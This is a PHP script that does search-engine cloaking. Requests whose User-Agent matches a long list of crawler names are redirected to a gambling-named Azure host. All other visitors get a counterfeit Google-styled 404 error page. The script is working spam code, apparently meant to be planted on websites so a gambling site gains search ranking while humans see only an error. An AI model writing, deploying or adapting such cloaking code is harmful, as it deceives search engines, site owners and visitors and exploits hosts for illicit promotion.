<?
function isBot( $user_agent ) {
	if ( empty( $user_agent ) ) {
		return false;
	}

	$bots = [
		// Yandex
		'YandexBot',
		'YandexAccessibilityBot',
		'YandexMobileBot',
		'YandexDirectDyn',
		'YandexScreenshotBot',
		'YandexImages',
		'YandexVideo',
		'YandexVideoParser',
		'YandexMedia',
		'YandexBlogs',
		'YandexFavicons',
		'YandexWebmaster',
		'YandexPagechecker',
		'YandexImageResizer',
		'YandexAdNet',
		'YandexDirect',
		'YaDirectFetcher',
		'YandexCalendar',
		'YandexSitelinks',
		'YandexMetrika',
		'YandexNews',
		'YandexNewslinks',
		'YandexCatalog',
		'YandexAntivirus',
		'YandexMarket',
		'YandexVertis',
		'YandexForDomain',
		'YandexSpravBot',
		'YandexSearchShop',
		'YandexMedianaBot',
		'YandexOntoDB',
		'YandexOntoDBAPI',
		'YandexTurbo',
		'YandexVerticals',

		// Google
		'Googlebot',
		'Googlebot-Image',
		'Mediapartners-Google',
		'AdsBot-Google',
		'APIs-Google',
		'AdsBot-Google-Mobile',
		'AdsBot-Google-Mobile',
		'Googlebot-News',
		'Googlebot-Video',
		'AdsBot-Google-Mobile-Apps',

		// Other
		'Mail.RU_Bot',
		'bingbot',
		'Accoona',
		'ia_archiver',
		'Ask Jeeves',
		'OmniExplorer_Bot',
		'W3C_Validator',
		'WebAlta',
		'YahooFeedSeeker',
		'Yahoo!',
		'Ezooms',
		'Tourlentabot',
		'MJ12bot',
		'AhrefsBot',
		'SearchBot',
		'SiteStatus',
		'Nigma.ru',
		'Baiduspider',
		'Statsbot',
		'SISTRIX',
		'AcoonBot',
		'findlinks',
		'proximic',
		'OpenindexSpider',
		'statdom.ru',
		'Exabot',
		'Spider',
		'SeznamBot',
		'oBot',
		'C-T bot',
		'Updownerbot',
		'Snoopy',
		'heritrix',
		'Yeti',
		'DomainVader',
		'DCPbot',
		'PaperLiBot',
		'StackRambler',
		'msnbot',
		'msnbot-media',
		'msnbot-news',
	];

	foreach ( $bots as $bot ) {
		if ( stripos( $user_agent, $bot ) !== false ) {
			return $bot;
		}
	}

	return false;
}

$result = isBot( $_SERVER['HTTP_USER_AGENT'] );
if ( $result === false ) {

    header("HTTP/1.1 404 Internal Server Error", true, 404);
	echo '<!DOCTYPE html><html lang=en>  <meta charset=utf-8>  <meta name=viewport content="initial-scale=1, minimum-scale=1, width=device-width"><title>Error 404 (Page not found)!!1</title>  <style>    *{margin:0;padding:0}html,code{font:15px/22px arial,sans-serif}html{background:#fff;color:#222;padding:15px}body{margin:7% auto 0;max-width:390px;min-height:180px;padding:30px 0 15px}* > body{background:url(//www.google.com/images/errors/robot.png) 100% 5px no-repeat;padding-right:205px}p{margin:11px 0 22px;overflow:hidden}ins{color:#777;text-decoration:none}a img{border:0}@media screen and (max-width:772px){body{background:none;margin-top:0;max-width:none;padding-right:0}}#logo{background:url(//www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png) no-repeat;margin-left:-5px}@media only screen and (min-resolution:192dpi){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat 0% 0%/100% 100%;-moz-border-image:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) 0}}@media only screen and (-webkit-min-device-pixel-ratio:2){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat;-webkit-background-size:100% 100%}}#logo{display:inline-block;height:54px;width:150px}</style>  <a href=//www.google.com/><span id=logo aria-label=Google></span></a>  <p><b>404.</b> <ins>That’s an error.</ins>  <p>The requested URL was not found on this server.  <ins>That’s all we know.</ins>';
	exit(); 


} else {
	header( "HTTP/1.1 301 Moved Permanently" );
	header( 'Location:https://slot4moneyz.azurewebsites.net' . $_SERVER['REQUEST_URI'] );
	exit;
}
?>